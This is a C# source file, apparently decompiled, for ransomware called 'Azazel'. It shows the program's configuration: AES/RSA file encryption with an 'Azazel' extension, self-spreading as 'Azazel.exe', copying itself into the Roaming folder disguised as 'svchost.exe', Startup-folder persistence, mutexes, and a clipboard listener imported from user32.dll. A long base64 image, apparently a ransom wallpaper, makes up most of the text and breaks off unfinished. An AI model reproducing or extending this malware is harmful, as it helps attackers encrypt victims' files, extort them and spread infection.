using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "Azazel";

	private static bool checkSpread = true;

	private static string spreadName = "Azazel.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD//gAfQ29tcHJlc3NlZCBieSBqcGVnLXJlY29tcHJlc3P/2wCEAAQEBAQEBAQEBAQGBgUGBggHBwcHCAwJCQkJCQwTDA4MDA4MExEUEA8QFBEeFxUVFx4iHRsdIiolJSo0MjRERFwBBAQEBAQEBAQEBAYGBQYGCAcHBwcIDAkJCQkJDBMMDgwMDgwTERQQDxAUER4XFRUXHiIdGx0iKiUlKjQyNEREXP/CABEIAY4B9QMBIgACEQEDEQH/xAAdAAEAAQUBAQEAAAAAAAAAAAAABAECAwUGBwgJ/9oACAEBAAAAAPlaMAAAAAAAAAAkxgAAAAAAAAAEmMAAAAAAAAAAkxgAAALlKAAAAACTGAAACuTJdbjx0AAAAASYwAAArlkZ5eGHgw0AAAAAkxgAABdJmbHqMPJQo2GgAAAAJMYAAAZZs7ppjX8vEjYqAAAABJjAAAFZM/e7qquk0ESNjAAAACTGAAAMkza9QrZXLzWpix8YqqooAACTGAVrWq5S22isif1M/U7K3T76zloMXBSt11aqWWW2gACTGBfkyy50m6luOFBj47pW+6SLpN9dz2x28PmYmGmTPLzX1tjwIuGy0ABJjC7NK3G7lioxaznYM3tM0LHOux5L2m0bb7KVcpQpD0OlwYwAJMYySdp0cwAK05HL1IMNJFdRqumyqACFymrxgAkxl8rb9RkAUVK6jnuqmxNLuJnO7PZQ+c2O9oABZxmmoAEmNXPN7GUWxsNqq/LJqhcnJ6aVrMs7UbjDzUXe7dSPGK1rlk1I/nuEAJMbNsth0dIcaDEwY1b80vezq4OJvndFItyUs5mBj6rZ0i8hEpW7Jflk7DPOrwEQLlokWdFvIu553WYI+CyirJK2fWVs4S2Xs3S2285qY9e1m15HR4KLrssufMy0xRoWvjJ07Dr8BJ2PpWD5f+nonC66xkzyc9cdt3XSqcJF2HWeHdP7NoeXith6DNcNq9bAxs+86TebCHdtsOl5Lms3WL+V1NqZ1HtHzH5jtPrDzDnpefXy5kiqdJzzacXq+h3vzVT3breXaub1cnHopk3kufp0Gv0Ou0s3ZzZsf0Tn9zZ5X77wGgtT+39D+Kul5j3/AHfC8HrJWk6Hv+lt4Cvrt2PnNB2nnvAYZf1H8/czsOd3HpnVYuN0Xq/HU3/gPU/QfV4MVLdZzEKV8+fQ+2891dG49B4nyL78+JtR9P8AG7Xlo3q26x7TpuD+QvoPLii8n2Xzb9Lb/wCQPojoNHy/uHbY9Rt4vxR7dyOfYeB/UkrlYeK26ynV+GwvqrzflcR1vpXzRtvpbk/lH6huh7i/W62Z22k+XfofXSZzXarwX7u9A+FIfuNNzudfiwSvlX2HZcVuOh+a/rnj+Xi4rVd96P8AJnsnacDAHpnc/F3q3us/5I9K9D4KHjjS+1g/P/0lH4+V11dz4z5X+iPUeI/Hv05zXRZr88D5v9x6LgNT0/RfMv3Ny2g1+ugxMPT+gfHfvcfm7R7lrflGX0mzhXfR3lOgpK7CJ4J9C7rg9bJ7nYdf8ocz2u+6rwv6JT8u9535t9U9V8556nY998gdR2Wxm2T9rA22w+T/AKB57Wh9F+B+RfY/Z6vz35m+xvKeUy9VH8R+jN953oGff95P+P8Atftjd2fDfb9/rN1F+WvZPUvPOSj39pvfl2+Vkm7XZ39X3/NfOP0NycMPevkD076b88g9d83fQnE8VuZvhH0d33nHKYb2X0jjPCPtXLf6Z5/89e06yV8m+pe6+ecfBpTqpPzt9VbfSTdlIg8/svOfFPo3i4lVHoPzz7b2vnVvf+eemw+F6jwb6I9u4nkoEfJj1HSeOcb908RG9F2/xn9N6/5y6b6f4jkIMeLElU8B9E9r4yJkzYsfYeR+c/TPLxqxIVnpnmnXSOMu7bn++k8C8lj4sFqy/ae2dLzPkX2Nwdnb9x8QfVHC/OkGyNatS/Uuq+d7vqXZ89ptPrb+88O5v030PeOb5bX/AEB5VuOf5yvSxO5zcJO7rpskKmXkvMOxn5fQPmr6Y4mzre5+S/dfNOl7HZxYlOS8wi9I46Bzmbqenza6L1vjWjobD3HS6j3DzfouJ1LY7zcweWx7PYyZU+dNyajmpXZ+R+l6LP1XQeZ2cpK3e2l1sxQNHoMG66/qZ8HieLQdnn5vHl33YQeUgej59BzMZfPkxIVla3SNh1G1ga+Hn3NIkHJ01+h1MNlz5M+zjcrAj0vnbnd7KPz3Ow79htJt+OBqoVu7shxKFa0oEja9pUVzVssVuWWgOM1GChfmzo+ChdWq20kx1AAZ9n211IWLFRfffsccGyyxRPmU4vWR7QAAEmMAAyTOnnwtZEjW1zSpPTR+cwR8Ntb8+2jamNhoAAAkxgADNIz1xYMVKyJkzqsPMxYce2t117HjsAAAJMYAAXXrbaK5503q8XLw4WChUUAAAEmMAAAFc06f1NnKwYWIAAAAEmMAAADPPn9RbyWviWAAAAAkxgAAAZ9hP6ZyGviWgAAAAkxgAAAZ5+w6W7j9dEoAAAACTGAAABln7Hpr+P1sSgAAAAJMYAAAGSdsulzchrIdAAAAASYwAAAL5uy6bPyWrh2gAAAAkxgAAAXS9r1t/P8AOwrAAAAASYwAAAKytz1zX8fAsAAAABJjAAAASdr2N+n5eBYAAAACTGAAAAzT9tM1WthWAAAAAkxgAAAL5cvLhhRrQAAAAdDgAAAAZs9+PBiAAAAA/8QAGQEBAAMBAQAAAAAAAAAAAAAAAAIDBAEF/9oACAECEAAAAAAAAAAABHvQAAABzPnnqsAAAAIeVuZ98wAAAGXJ6fMPd0uc66ADlMex5ZZ5+zBzf5+icUpWXdAKM+q0Ro5dzqnF6VorrukBXi9BSL6/N9HBLV5fqaIOLFdgFWSmrTbzJu1eTT7ffLj6nM1lVNerVYAjVZMhm2Yc/qVYNWuucuc4l0AAovzWxQunXYAAAKOz7g3eX6M42gAACGfXzLr8z06rQAAAZ+34N3YdkAAAOR5VpOY9fegAAIY68uqOX28Cc7u3AAApo25ZoaaJF2DbIAAI46KtkPL97w/Sth2eroAAOR7KnxvZ8j2Lec70AAAKfE9rzvWkAAAAVeJ7Pn+t0AAAAh4vreb68gAAADnler52+YAAABzzrM/pzAAAAGfztO/oAB//xAAbAQEAAgMBAQAAAAAAAAAAAAAABQYCAwQBB//aAAgBAxAAAAAAAAAAAA92Y4AAAAD2ZneOv8gAAAB1fQqkm6fygAAHp57P2Sg7LdoqunLJhiADZI7cN+fHx3Sr3L2o3OD5ehp08EdgA9lJuAj/AA3yeyOz1ZSNro3B4dnbGaQO21UvyT8y9iO270y26YK/UCF6csveJ1cgHfZZPug4zdY6pX/okp8q1fQs6FnNcvbLdlfr3IB7t7uLT46Zyt2uZoPfca5Xu3k1e57nPiAAS8TNx3T50Rejs4wAABLauby31G/0vl3cAAAA6JuuZWKt32hSMf4AAAPZjGJt1Sx6sNPgAABs2bJKC8bbFXcPPAAAOi0d09X+ie+V27Hm5o3CN8AACSmKtP8AJ70wkpr8xj7bVtQAAbrNKyVV7b/8f+sUeN7dfHA4gAA2b9OuR+ofMfo3zXg9zwxAAACR+r/K7x860AAAAHd9Z+W3P53rAAAAOj6r84vPzXUAAAAbPoXz26U7QAAAAZXXlmqBzgAAACaukJUNYAB//8QAJxAAAQQBAwQDAQEBAQAAAAAABAECAwUABgcVEBESQBMgMBRQCBb/2gAIAQEAAQIAM/3zP98z/fM9rt27f4RnsIiNRngrFaqf4BnrpjUaxI4gZhXMc1U98z10RjWMEGYwkeeB7HNVPeM9diRtjYJB0PEex7HNX3jPWTI2xsrx8798sQ3se1zfdM9ZqRNGhjZI9izugmchwj2Pa5v07du3bt29Iz8e3j4ePh4eHh4KnREYkTQB8LmhUjB52umiIgex7Fb4ozw8Pj+P41YrFaqegZ90a2NsMQDKRKLglo+DfSyVz4HM7NSNK4bCpnOGWfEwOfCxpGOYrEjSNgzKviEp+GWmfUShujVip+xn1RrY2QD1MIXb6d++PHIpi65EHjHhyUTjo2KiQIzpZQObHBBURgo37KkwBVO+JW/qZ9GtZGKEOF+fdzbMOo+6z/1NXLGeGKGDO/5FAGgOT9DOrUjYEJFF+Hfv1TLmOJ4heEtfMA53QQfCyXvq2L9e/wCEkdnXr+hnRMYkTQ4OqueYtlyfKcnyKHxkp1sm5DIMThYlfioOMiETzTK6oRei5MRyfJ8pyfJciw1HdSoJ4/zM6RxwixiwySEPsH2EhLpnTLN8vzJM2eOYUlOhLXYx0Eo5GMZjWySEkuf5VTOhRBJSyfJ8iSJIkiSRzx2TLOMmaYt/b6ePb6GZEwEEyLT92VXERuldO6ZZVf5eXl5NfHIMQ1ckyTGujcOpGqmIqOccW96uTK9vj420z1V3l5eSPbkccYzA/wCBa99c+skAkHVESIZoMokkfUvAIKas3ONBO0rqS2CKRX90a2FgjQEreNWv/lRgb8XCU7jNBD1YdojWE0FlkmOayCEISuSufXk10tdKG+PpFGKCLUwU6VbyYy21clOXVHBTQjDA11pYEDFxO6kJTwUAe7GpMprYl9oP8cQkuf8Apo9Ys1wmvF163W49uRXVzF6WbESth1NYqubZXtxB/NJE/VEGu491k3bn3aXcWPU5NWaFIxjAhp9fG7lruDJLDo1u24uhpzo9xGkSxVoOq9U6Vpzx7BXdZUoorm7c5dIZtHb3Qdg8nVMNdYadym0pXbMs2MK2Gu9rdO62gZImXcEbKaDdG3qas4Gis7ZLDWzmyaTyn0/W7HP2DfsNb7NUGp5Ji2Cx2UeaU0lU7fci64W55l1wTZmFQRXtyUVtlQ25Rsq9fjo4N4LylqoBte6Q0veWo7xq8HV17UbR1umlsUtBTBn7ha/AGMfI7DIIIhyDTP8An7S+9W3+aCvGhawv63bTTegGlrZz2gc+ptW395AEWtezWjM24CsrSa3dbLa8olo6xjlrB9YW+nKk+ezMlf1ggphddnbXQOstwq3NBnHRwlw2r7qe6fbim1j9b7lZpzTlgSAT0JB1vPm2Abc3S0zoCyKfDYhnSWklk48GS/1jfX+htH25k0lWmq1yphtGyROjVM7tWuiAHkXaUC3NLm+gApxD37QCTCCQauotm7C4iJm/veepQzaoPV2uhRdM6Vs7KcmrJxMDG3SLzSIUMH/QWkQyS3OeI9Zo0miv9S2lnonQdtYmld6huswMDrz6eWllppah9Y8Bo1VBI9V0AlmQ5fpUC7x2mBzsEfrPU+sduTruKyaq4PDWV+qtZPft5pi1sTC/ON4c0TaqDWNtkGuK/dGv3+LzR8/8mRsDE1NqezstsNJ21hYGPezKRmo5MqtaCbws3iZuyu5w2tGrKDWj60JygQ5/1pGbzX2bS0JZri9abdiy2iW0b0hirQNV6qYzSO3VtYHlucisWqMDj1LaZt3TBIGdcaF3C282jIKGRgQmrtTWlpobbQ8yzOmkxmUebkSYyOOt4eDS0O3se1T9rNK6eBZu0VgqFr9YbIwrZ2mtrU26it60/cqpp5rmJ8dcLqa8fJttt1aTWT5oUF/j/nibpyfee1zQenjy6y4Asd56TZWayiggurm2t9uturImzKIxR1HbFTu3Mlzao+xs0uYrqO55cizmMrpN4icchXTt26ayJQXZdt3YlGjFUxW8DNu33UL4qxl5Z7U7bmSWLCAVqkiVr694lOzcQhopimEDOqitRM2tJsY4U3IvdrtuinWWECcZJA/PhDbrxmbc6jtRiIvladyb7NhlPJugbkcBICVygSDOZmqKnWFTtc24nlWFaebdhm17blkqXEM2nf45Ylf8vyZHGBa1hVYgOmdONtnFKOtS9qaGHtHHnT6aQKQdX/J8ndEhm0xa2Tsa7TmqSqgimnrZx5MgfSyavlzS+4A2omQTVZoRMS4Dm9i6VhtJFxq1k24z9vSbWcmQAyvt4bySylibV8MftVe7T6JLNlrpRp9qhbR5GQrWSCEaRW/IQyvtRbdT5IOHWottu73avSriZRTL/SE23hlIDfibmjbkkX06RrVEan+sFlVIZjsFJ3didYnSdBZiY6xTTZ5Y54bBlu25juY7iO2Zauti7GecKYYvbAmwslsITwp1tH0ttYvlgKgs4rdLjmFuHXE1sVYTzsmDPBtx7VqF6asduTtv3w9wyDtPz7cJtpHtgDtcHSnmky4h85xpk7+jHRE/2ykudnfzSSOWGYGD5CGvY4aGCFUgnasMcMMphMsk0ShoE0Ro6QRCNDJAmkkkVca+Ewe0guW3U9sWbPLjXwlxWjbfmH281lMU52TlKZLOq9e/l3+iZGgrU+qKkqyud07o9Xqv4WTHov0R7SEMUx8yr18vk+X5Fd1MXv8ArGo72Liq45bNbfmeZS3SzSwas0q2a2q2/M8zzPMCmY5xsj8X1TP3asbwrJTiLB0r5XSfIkjHse1Y1Nx2OVz1f8iSJJEQy5Js3Ocq+qZ6DXNlSZZnTOkV/mjmOjcxY8Mx2PV7ld5+SPR6SK9XKvqmeijker1d36JjMjxmQ4Xj8kV6r9O/fv39Yz2ExmR4zIcKyTJFevvGeyzIsZkGE5JkiuX3jPZZkWMwfCMlyTHe+Z7CYzIsjwbJ8lyTF98z2WZFkeDZNk2SYvvmeyzIljUTJcmSXF98z2W5EsSh4/JklR3vmeymRYOkbMsRpcd75nspkSg9bJJcd75ntRqLIx+Wk0uP98z2mLE4Yt1lNJKr/fM9pqxuY/ze+Ry++XR8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8GlG2lbTcO6mdSLR8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB8HwfB//EAE0QAAIBAgIECAkJBgUDBAMAAAECAwAEBREGEiFBEBMiMVFTkdEgJDJCUmFxc7IUIzBAUHKBobEVM0NikpMHFqLC0lWClDQ1s8FFZGX/2gAIAQEAAz8A8buvfP8AF9v+N3Xvn+L7f8buvfP8X2/43de+f4vt/wAbuvfP8X2/43de+f4vrc0wzRNlSQnKRMvsPxu698/xfWjNIq7htNKihQMgKS4jZGHsponZGG0fYXjd175/i+s5kAUIYxn5R5+ETprKOWKIJBH2D43de+f4vrOseNYbBzeDzzIPb9g+N3Xvn+L6wZXVBQjRVXmFCNSxrNQaKxsw5xtpZUDCgwII2GjC+YHIP2B43de+f4voz4B+h4qMOw5TcGu2oDsFZxJ7BXzMnsNGFwfNPPQdQwOw0syFGFNE7Iw8A/W/G7r3z/F4efATuqeXyIjVw3lFVrpm/Kl649ldE35VJ1gqYeSVNXCZ5xH8KZTkQR4PGvrsOSvBxaZA8o8GcEZ9VfNSfdPAUPFt5J5uATocvKHNRUlSNo8GR/JjJ/CrlvMy9tXH8tTb2UVJ1i1LukWrleZQ3sNTx+XEw+peN3Xvn+Lwc+AkgAU75NJyV/OoIByUGfSaA8MVDJ5can8KglzMZKGp7Yksua+kOBpHVFG0mlgiWMcBlfWaSo97mhGgReYUCCDUQ5kFKPNHCABMvsPBJK2rGpJrmMzfgKto+aMfjSrsAA8MHnFW04OtGAekVLHm0XLX86Kkggg/T+N3Xvn+LwnnOSjZvNRQDYM26T9KrgqwBBpbacFByH2il+U7efLZ4cI88VDubOsxnwKQIRz85ozSrGN9RwqFRQPpYbkHWXJvSFTWpOsuabmH03jd175/i8Ezvl5o5zSRKEQZAfT60Cv6LU0bq6HIiluE27HHOOCXV1onII3VMeeRqLQDM5nM1yTXKb2ms8pHHs4BChA8s81FiSTtNa0rv0D6dJUKOuYNNaPrLtjJ2er6Xxu698/xeBnkKEMKjedp8BV2kgVAnnZ1COmoOg1B0GoOg1CemoTuNRyHIeBrWknq4GjYMpyIpZ0/mHOODPOSMbd4rKEj+Y1sNGSV2YckMay2ClgjLHn3Cmkcux2ngzSVvX4EUGRkbLOrT06tPTq19P8AKrX06tvSq29OrdyAH7aVhmD4C3ELxNvFGKR4zzqSPpPG7r3z/FwFqY7qZcjlSNGMyAQNoNRR56zilHkLUhGzIUzbWYn6DIgg0Jhqnyhw68Eq9KmsjwNGwZTSzL6944AmeQyz4AoyFLEhdjsFNM5Y824cOraqfSJPCltGXf8AAU87l3Ps+gdDmrEVKoydQ1IfLQioZfIkFRwozu4AArjp5ZBzMx8I0fB8buvfP8VFzRcjZUOEYbdYncxsYoE1iFG05nICsH0ib5PaM6XYjMjQyLkcgcjkeY0yZ7KKE0R4Jo0aNHgKSI1ZgEcGaP7DWTN7eDOnVgyVg1je/IL2WSOQIGZ9QlATtyzG3OkmijmiYPG6hlZdoKnaCKIoKCTzCjMxVTyBw50RaQ+yjR6KaScoPJTZR8ImmNOd1Md1Md1PuBqVufM03o0y7qZN1EUTRbdRy5qK7q1fA8cuvfP8Va7LsrX1OTUGAaJyW+ojXGJE20asM8lyzd/wq7w27hvrGdoriJtZHWrDTDDfMixOFPGIP96dKmjGW2UUY0aJommO6nO6nO6n9Gm9GnG6nXdTLXGW8bergzBrVmlXoY8BYii+WyoL/G7yS3QCNDxQYefqbNavkMkWEYrJ4k51YZW/gsdxPoUMg6kFSMwRtBBpkhyG85cDGnY81MxHJplt4Rq+aKb0aKozFeYE07yO2rzsTTjPk0y7qK8Jc0z5bKJy5Nc3JqOJdeUqqjexyFYBC2pNjNgjdD3MYP5mtHpnEcWNYe7nYFW5jJPYaikGaFWHSu2ly8mgAeTWpnsrJqLsNlFsuTWC4IY48Ru0jkfmQAs2XSQvMKjkhSaIho3QOrDmKkZg1qk+Bne3Pvn+KtZ02UCE2Uce0rureCXWscNztIAOYsv7xvxbgusDxOzxSzbKWCQNluZd6n1EVa4vhtrilkweC5hWVCN2sOY+scxoo7bKOdF91WNkM7y6ih2Z5OwDEeoc5rR6FtXjZpPWkez88q0aXnF1/aHfWiy84u/7Q760UG67/sjvrRPou/7I760TlcIZLiMek8Oz8ia0axBglrisGuxyCyZxkn1a+VFN1ERSIfNPDqXco6TnW2tdloaPaN3N1GwW5mygg6ddxtI9g21mSTwNiNnPgN05ea2XjYGY5nidg1P+01lFll51FjzVa2qCS8uIoUOwNI4QfnWjNq2qbl5jnkeKjJHacq0VjK64u/wiHfWhKKo1b/YOoH/KtCPRv/7A/wCVaFSQuiLf5kdQP+VaHuQD8sUHeYR31odetqRYxEjHrVaMdrACo5IxLCyvGwzVlIZSDvBFahOytU1rNShTJIQqKCzE8wArCLA6llaSXZHnk8Wn5gmsfn2WKQWafyJrv2vWmGqV/bLj2Rxg/DWP47LrSNf37n3k3Zz1pZOck0dxAffgZPiArTRgD+xHHtkjB+Kv8RLF9eys7qBhviukQ/k9f4r4Pnx5xUog2sY/lCZetsmFaZJmtxFFP722I+DVqW+w20vLm3ME0sSu8R80mtZ61mXZUGjFqLO01XxOVM1HOIlPnt6+gVPpfpEI7yZ3XlXN1ITtKAjMfiTlUNtCsEShY40CIo3KoyAoazVtPDnfXPvn+KuUlf5Z0VxXF0AM0UGrD72TkJ2E0zszuSWYkkneTWOf5VXTEW2eFG6NsXB5QI88j0CdmfTwfKsNxTR+Zs2gb5VBmduo/JcD1A1y22V+z7We7MRfixnqj25Vik+awOtunRGOV2msWxF9aCyu7l3bLNY3kJNYxhUCz4lai2DHIJLIgk/oz1uDSHH8zheFzSoOeQjUj/qbIVpFcEHELyzs03gMZX7F2VE2WekbfhbD/nV1xZNhpBG8nozQFF7VLVplggkkfDflcCDMy2h40Zfd2NVxhcUeFYrbvNArBUckiWMHdt5wKEc7LudayPBtjnA9RrNxWbLsr5Ti1vhEeyKwj5XrllAY9gq9xvErPCcOh427upRFEmeWZPSdwFXWGXl1h99A0N1byNFLG2wqynIinwbF8PxJM8oJkZwDlrJnyl/EVHNYx3cXKikQSplvUrrCsSlZ47KJLZMyM8tZ+01iuLSmQpdXch3hWkNaQW9o17d4c1rAo1ta5dICR6lkIJ4Max+4Ftg+Gz3Um/i15K+tm5gPbWmd4yG9NlYx7zLNrv2Rg1HAicbpRm559W12fHRaMm30kzk3a9ts/Jq0zwxeMt4IMQjyJPyWTlD/ALXCmsX0PnnsL2yla3LESWs4aN0cbCVz5jUGJ4fbYjbqRFcRCQBucZ7jWTGtZxXEaOYxL/8AqSL/AFDLgxHSy+NrZ5RwRANPO/kxqf1J3CtE8CSJ5bQX10o2y3XLBb1J5IqCBRHCqIgGQVQFA/AUvpUvpUvpUpHl0rA7aEhO2uMcbKi0Zwlroapu5c0t0Pp5eUR0LVxfXM13dSmSeVy7u3OSaOE4HLi91Hq3N/kY8+cQDav9R20OXtrWY+BrX1z75/irIpspy2GaOwyERxp8qnUb3OxAfYKnxvFsPwm2/e3U6xg+iDzsfUBtrCIcDi0cNrG+Gpai1MLKCrRhdXb6zU2iGOS2i6z2E2ctnKd8fon+ZeY1Lo7jdlicYzRG1JU9OJ9jCklUSJtVgGB6QaAchlBG8GrEFT8kgz92taYHFf8ALuj9pLDE6JqSwIdeTWG06/MoFXNyyXekeK6jM2tJDDy5D7ZG31orgaMtjhNuC2Ws8g41zl63zqOMBUyVRzAbBSk+VQfLbQYCsM0Qs3t0YTYvNETBANurnsDydC1iek+NovGNPd3MpkllkO7nZmPQK4mVGB8kig2TDmI4BcW8ke/LZREmRG0GosMsLvEJvIt4XlPr1Rnl+NT4heXN9cvrTTyNI59bGkUX+lt5ApOZtbIsObrHHw1HjVm+lOEQD9pWqZ3SL/GgQElvW6cBxjRv9n3BzuMOZYh64SOR2c1WXGEtaQEk5kmNaxzBLexttHbLbc6yGZItcodyqBszNaRaQyHENJcUNu0mRykJmnI7clrQ7AI4p48LjuLoLlx11863tAbkg1bWqcXbxxxIOZUUKOwUPSrjbggNsXZWtlWD6J4YcQxWYjPNYYk2ySvlnqqKxTTHHpL2fWkmuJeLt4RtEaM3IjWpMKwPDcPnI46C3VXyOY1ucigZDWs60U0QuyuYzlhB9msOBMJ0PtpwuU16z3DneQeSv5CipYa1NmeVTelT+lT+lTelTNvoysK1ipNHGMcu5VJ4iAmCEfyIef8AE7abHMbw7DADqSzLxpG6IbXPZUVrAlvCNWOJBGijcqjICizNtrXY+BrXtx75/wBayC7KF/pbjcytrIlwYFPqhGp/9UZNLrWfdbQTTf6dT/dThss6TSHRa7Ij1rqyBuoTv5Hlj8V4P2vofY6zlpbQtaPn/JtX/SRXFsTXFnnoKPKoDzqO3lUzHyqeRhtpjq51baLWsmH4Y6T4y4yC86QA+c/r6FrFdIcTJJmvcQu5CSTmzuxq30SwsxyFJMQmAa4lHwKfRFBmbbQngCk8pNh4dWVZ0GxvK9tfI9FJY88mupooR8Z+HgbD9BdHIiMjJbcf/eYyD8jWuQrDMHYQaXRbTHEbOBcrW58ctx6McxPJ9ikEUcP0it4mY8XeA2zD1vtX86MTmtXfRmcDPkjaayGQOwUx30yRvITzCpJG1iTtOdYbojh5nunEl26n5PbA8p29fQvSaxbSjE3v8SmaWZzqxxr5KLnsRBX7Dt/21i0QF/KnzMTDbCh25noc1rFttaz1m61bx6G4sbggAxqqffLDV4DBorgEQ3YdbntjBqQs1SZmnFMOfOjRo5ii7LRFrMwG0RMR2UTI5POWJNahxbGnXyVFrGfWcnaiS+2i7Hwda7nOX8V/1pMD0exXFn2fJrWR19b5ZIPxNM7s7nNmJJJ3k1JPpDfyqORFh75+1pEypw5rMFHGasCCOkGn0c0gxDDCDxSvrwE74n2rS8bjWDu22SNLmMfcOo36itXW2UY2NMN9MfOp2PPTyMKYlSRUGjUT4ZhmrLiboQzZ8m3zGwnpboFX2MX8dtbo9xeXMuzezM20kk9pNWOh9o7lxNiUyZTT7gPQToFFiw1q12O2uKuFBPJfYeDbQnUxsNhoriNjg4bZaw8Y4/nkPcOCW20U0aglXKSPC7NWHQREK5a+2mv8AtNJbWHWnw19SfLn+TSf8Wp7S7trqM5PDKki+1TnS3Vrb3sXkTwpKvscawplfKjDCB5x2mmNM5pnMcI9pqw0RslkmAmvZB8zbBsif5m6Fq+xzEZ7+8dpJ532DnyBOxFHQNwqLBIoMcxldbECoeGE80Ge8/z15Q1qLsdtZtWbrUl1oTiZj54RHMfuowJ4NfAsIOXPY2//AMYoljyaO3kUw8ymHm0w82mXnFEMNlcpa+RYLid31FnNL/QhNEkk85r5LomW1v393LL7NgT/AG0WZttZknwda5l2fxW/WkwrRC3wpP3+Jzqvsih5bHtyHBfwy6mHzTpLKQurAzBnO4ZLz1p5E6ypa48rqcwRHcV/iFhOot1eXkOXMLm3AJ/rWpNLbOwOJ2UaYnakoLmHkrLCdzqd4NJYaY4M8hyWaRrc+2ZSg/M1sairNRz4C7CixU6tQaPRS4Xhh18TK5M/mwZ/q1SSyPJIzPI7EsxOZJO80mB4d+28QhyxC6X5oONsMJ/RmryhrUWY7aJNZEEbqE9vG+/LI1maGYJpMb0mxjEYv3TzlIvXHHyFP4gcGnzIqW+kmLlEAUBJ5CABu2V/ibhS/N4xdyIDrZ3UIm/ORSa0gngu8K0uw20xbDLuJ4J1RBBMI5BqtkRsq1F3dCxMhteOfiDIAHMefJ1gMwGy56GJaHYe2ZLW+vbtn0ocx+RFa0+eXJU58BY15xHNWH6LwmSYcbeygmCAfE3QtXmL3s9/fSmSeVsydwG4AbgKFzMdJMTg8XgbxRX2a0oyOv7FrIMAaLs22ixzrlCs3So7XQfSKVyo1rGSIZ9Mg1RwaVYLkMPxy6SMDVETuZYgPUj5gVpFGgS/s7K72+WUMb/6TlTH99o9GfuTkfqtYPJ/6jBLlDl5jo/66taOuduGXwHsj/5VohfbDdyWzHdPEV/NdYVhN+jPY39tOBz8XIrZUFOYFZOuyvkOheNODkZIRD/dIXgFvonhKg+VCX/qYms3PhD5RJ7xv1pcV0qGHwtnBhcAt/bK3Kfu4LLCtDcPxG4w6FMRu2kmM7RDjuLLZINY7cshSAnbUMvJkVWXoYZirHSWMX2DrBZ4kmetkurHOOhtXzvXUllfW84zWSCdH9jI2dCWESLzOoYewismauUaLkUXK7KTR2EYfhro2JOOWefiFO/7x3Vd4jdqiLJcXdxJkAM2eR3P5k1Y6PwxYljKJc4mVDLGwBjtz6ulvXWWsM6LlttFjw8TJxTnkN+RrWZSKXR/RXFsQzylMBhg97LyV7M8+C2x3S/CrG9tuPs9Z5J0OeRREJ2kVheEW6WeGWVva2680cMaovtyFRSOqsFIJ2gitCtJLW5hxHR6x42dTncxQJHcKxHlCRQDnWKaAYkkF06T2Ny8hs7hD5aIeZxuejcYZjOG745knUffXVPw0Ic1AolqLkbKs9EsMLEo99KuUEB3n0j/ACir7Gb2W/v5jLPIfwA3Ko3AVG8MGOaSxnUPLgsmHlLzh5P+NRQRCGFVSNF1VRRkqgcwAFFi22i7Hg5QrlpSjQK6UsAXuLYD1nWz4HkOrGjM3QozNYjLmYrC5cDn1YmP6CsX/wCl3f8AYfurSS5/c4DfsDvNu4HaRWmM51VwKZfW7Ig/M1pk5yaxhjHS86ZfkTWlcW0i0/CasawT5UuKXSNEwAjhVy4DelQ1xXE6L2NqpyM98mf3UQngCaPYKoGQ+QQHtQGs3PhR4XbYniMvkWsc0zesIC2VS313dXs7a008zyuTvZzrGrTFtLTLf28E9tZWks7RToJEZiQi7G6C2dLGCqkBQMgBzAVyiNetZvKrXy21HhOld5xEYSC7RbtAOb5zY3+oGhe6LYFcAklsPgzJ9IIAayL7K5Zouw2VFo3hnF28g/aVwuUI5yg3uf8A6q4u52kkeSaeV9pJLO7H8yTVxg2ppFjkRS8KH5NbtzxBthZx6VMA1OxanYnYac7jT9Bpl3UQwrjNSCU7R5JrI4NgEbeSpvJR6zmicGGaO6LYXKtlCmI3dnHLdTgct9flhST0Z1JC5KNmtEzRgtvrXA21FpBoVe3GqTPhmd7Ew3BByx7NWgNIMVti37zDmYDpKSLXLbZWbjZVjothE2JXbDXyKwx75JCNgFX+N3st/iNw0szk85OSrnmFUblG4VdYpPb4/jMDRYbEyywxuMmuGGRByI/d1qAgU7FhTuTT9FP0UQwrVda19Dbdf/6EPwPwWcmhkQitYUuLa4lgldVAd/PBJ9jUyM22iD5VD0qX0qUjyqUg8qgzc9BmFEyYDaBuaOWUj2kAcGWEYYANgs4PgFcs8B8CSDRbHdTz2WM+x5ADUxtGvdX5kTCHPpYgtkPYBQhTSO987VghB9R1mNHN8mpix5VNrDbRJTbWeJYLc+nZsn9D5/7qE+g2FbSdQzp2SGtrbK+cqKGN55mCxxqXdjzAKMyafGMVvcQYECWQ6i+ig2KOyrKzitNJ9IGT5acpbS2dhlEpGx3B8+rYg5XEX9YqF88po/6hUTk/OJ2iofTTtFYSh1XxKzUjcZkFYNl/7rZf34++oZouOt5EljPM8ZDKfxFFH5qKuhGwg1PiOmV+mqWdeIgRR6kFP8tWyb95xwhPt1tWhbW0NumxYo1jAHQoyo6x20OOSRTkQaJ1dtG90W0iteuwu7j/AKoiK+T6a4UNcqJRLEfXrIdlco0sZ1moYzpBJFE5NvZL8nUZ8kupOswq30if9t484TC4XyiiLhTPIp+CrSOJYopYVRFCqqsoAAGQAFRPrZTJ/UKjdj84naKiPnp2isOhYpNfWyN0NKoP51hW7EbT+8nfVvNrG3mjlA59Rg2XZXFOKkutEn1P4FzFK33civ8Au4HwfGBh8zn5HiBWEjPYkpOSPUhLECpUY89Sp01Ku80486mPnUXbnosVpbvSbikbMWtpFCfbmXPxcAnwXCpY